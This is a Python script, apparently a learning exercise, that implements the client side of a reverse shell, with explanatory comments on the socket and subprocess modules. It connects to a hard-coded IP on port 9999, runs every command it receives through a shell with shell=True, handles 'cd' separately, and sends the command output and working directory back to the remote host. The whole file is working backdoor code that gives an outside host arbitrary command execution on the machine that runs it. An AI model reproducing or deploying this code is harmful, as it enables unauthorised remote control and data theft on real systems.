import socket
import subprocess # allows you to spawn new processes, connect to their input/output/error pipes, and obtain their return codes.
import os
# OS module provides a portable way of using operating system dependent functionality.
# If you just want to read or write a file e.g. using open()
# if you want to manipulate paths, e.g. using the os.path module
# if you want to read all the lines in all the files on the command line e.g. using the fileinput module

sockfd = socket.socket()
host = "10.5.122.199" # IPv4 will be of the server; currently using IPv4 of the local computer because the server is currently in our localhost; check using ifconfig.
port = 9999 # port address will be same in both client and server.

sockfd.connect((host, port)) # Connect to a remote socket at address.

while True:
   data = sockfd.recv(1024) # recieved in bytes format

   # data.decode() returns in string format
   if data[:2].decode("utf-8") == "cd":
       os.chdir(data[3:].decode("utf-8")) # chdir is for change director; chdir([path]), here, d[3:] is the path, eg:- cd Home/

   if len(data) > 0:
       # subprocess.Popen() will create a pipe, which will execute data.decode("utf-8") as a windows shell command (because here, shell = True)
       # will return of type <class 'subprocess.Popen'>
       cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)

       output_byte = cmd.stdout.read() + cmd.stderr.read()
       output_str = str(output_byte, "utf-8")

       print(output_str) # to display/print the out[ut of the command at client side as well

       currentWD = os.getcwd() + "> " # here, currentWD stores the current working directory as a string

       #sockfd.send(str.encode(output_str + currentWD)) # sending in byte format
       # [or]
       sockfd.send(output_byte + str.encode(currentWD)) # sending in byte format
